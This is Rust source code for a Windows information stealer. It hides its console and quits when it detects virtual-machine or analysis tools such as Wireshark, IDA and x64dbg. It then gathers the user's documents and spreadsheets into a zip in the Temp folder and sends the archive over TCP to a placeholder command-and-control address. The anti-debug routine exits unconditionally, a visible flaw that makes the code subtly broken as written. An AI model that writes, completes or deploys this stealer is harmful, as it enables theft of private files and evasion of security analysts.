use std::io::Write;
use std::net::TcpStream;
use std::string::String;
use std::{fs::File, io::Read};
use winapi::um::debugapi::CheckRemoteDebuggerPresent;
use winapi::um::processthreadsapi::GetCurrentProcess;
use winapi::um::tlhelp32::{
    CreateToolhelp32Snapshot, Process32Next, PROCESSENTRY32, TH32CS_SNAPPROCESS,
};
use zip::write::FileOptions;

fn main() {
    console_hide();
    anti_vm();
    anti_debug();
    directory_travel();
    let user = whoami::realname();
    let file = format!("C:/Users/{}/AppData/Local/Temp/sensfiles.zip", &user);
    let md = std::fs::metadata(&file).unwrap();
    if md.is_file() {
        let mut f = File::open(&file).expect("Failed open file");
        let mut buf = Vec::with_capacity(f.metadata().unwrap().len() as usize);
        f.read_to_end(&mut buf).unwrap();
        connect(&mut buf);
    }
}

fn connect(buf: &mut Vec<u8>) {
    match TcpStream::connect("C2IP:C2PORT") {
        Ok(mut stream) => {
            println!("Connection Succesfully");
            stream.write(buf).unwrap();
        }
        Err(e) => {
            println!("Connection Failed : {}", e);
        }
    }
}

fn console_hide() {
    unsafe { winapi::um::wincon::FreeConsole() };
}

fn directory_travel() {
    let user = whoami::realname();

    let filename = format!("C:/Users/{}/AppData/Local/Temp/sensfiles.zip", &user);

    let path = std::path::Path::new(&filename);
    let file = std::fs::File::create(&path).unwrap();

    let mut zip = zip::ZipWriter::new(file);
    let options = FileOptions::default().compression_method(zip::CompressionMethod::Stored);

    let glob_string = format!(
        "C:/Users/{}/*.{{pdf,xls,txt,doc,docx,ppt,pptx,odt,xlsx,xlsm,xls,csv}}",
        &user
    );

    globwalk::glob(&glob_string)
        .unwrap()
        .filter_map(|dent| dent.ok())
        .enumerate()
        .for_each(|(idx, dent)| {
            let path = dent.path();
            println!("{} {:?}", idx, path);
            if path.is_file() {
                if let Ok(f) = &mut File::open(path) {
                    let mut buffer: Vec<u8> = match f.metadata() {
                        Ok(metadata) => Vec::with_capacity(metadata.len() as usize),
                        Err(_) => Vec::new(),
                    };
                    if f.read_to_end(&mut buffer).is_ok()
                        && zip.start_file_from_path(path, options).is_ok()
                    {
                        let _ = zip.write_all(&buffer);
                    }
                }
            }
        });
}

fn anti_debug() {
    unsafe {
        let mut dbgtst: i32 = 1;
        CheckRemoteDebuggerPresent(GetCurrentProcess(), &mut dbgtst);
        std::process::exit(0x0100);
    };
}

fn anti_vm() {
    unsafe {
        fn char_arr_to_string(chars: &[i8]) -> String {
            chars.iter().map(|c| *c as u8 as char).collect()
        }
        let mut pe32: PROCESSENTRY32 = std::mem::zeroed();
        pe32.dwSize = std::mem::size_of::<PROCESSENTRY32>() as u32;
        let handle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

        while Process32Next(handle, &mut pe32) != 0 {
            // let  procid = pe32.th32ProcessID;
            let procname: String = char_arr_to_string(&pe32.szExeFile);
            if procname.contains("vmtools")
                || procname.contains("vm3dservice")
                || procname.contains("vboxservice")
                || procname.contains("vboxtray")
                || procname.contains("wireshark")
                || procname.contains("processhacker")
                || procname.contains("ida64")
                || procname.contains("ida.exe")
                || procname.contains("x64dbg")
            {
                std::process::exit(0x0100);
            }
        }
    };
}
